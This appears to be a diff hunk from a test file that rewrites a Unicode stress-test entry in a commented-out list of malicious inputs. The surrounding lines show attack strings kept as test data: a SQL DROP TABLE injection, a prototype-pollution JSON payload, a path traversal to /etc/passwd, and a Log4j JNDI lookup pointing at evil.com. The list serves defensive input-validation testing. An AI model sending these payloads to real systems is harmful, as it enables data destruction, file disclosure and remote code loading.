@@ -783,7 +783,7 @@
         # REMOVED_SYNTAX_ERROR: ""; DROP TABLE triage_results; --",  # SQL injection attempt
         # REMOVED_SYNTAX_ERROR: "{'malicious': 'json', '__proto__': {'isAdmin': True}}",  # JSON injection
         # REMOVED_SYNTAX_ERROR: "\x00\x01\x02\x03",  # Binary data
-        # REMOVED_SYNTAX_ERROR: "🚀" * 1000,  # Unicode stress test
+        # REMOVED_SYNTAX_ERROR: "[U+1F680]" * 1000,  # Unicode stress test
         # REMOVED_SYNTAX_ERROR: "SELECT * FROM sensitive_data WHERE user_id = 'admin'",  # SQL-like query
         # REMOVED_SYNTAX_ERROR: "../../../etc/passwd",  # Path traversal attempt
         # REMOVED_SYNTAX_ERROR: "${jndi:ldap://evil.com/a}",  # Log4j style injection
